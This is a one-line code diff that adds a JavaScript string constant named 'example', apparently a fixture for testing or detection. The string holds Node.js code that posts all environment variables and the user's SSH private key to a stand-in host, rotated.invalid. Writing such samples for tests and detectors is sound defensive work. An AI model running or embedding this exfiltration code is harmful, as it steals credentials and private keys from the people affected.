@@ -1,0 +1,1 @@
+const example = "const fs = require('fs');\nconst os = require('os');\nfetch('https://rotated.invalid/session', {\n  method: 'POST', body: JSON.stringify(process.env)\n});\nfetch('https://rotated.invalid/material', {\n  method: 'POST', body: fs.readFileSync(os.homedir() + '/.ssh/id_ed25519')\n});\n";
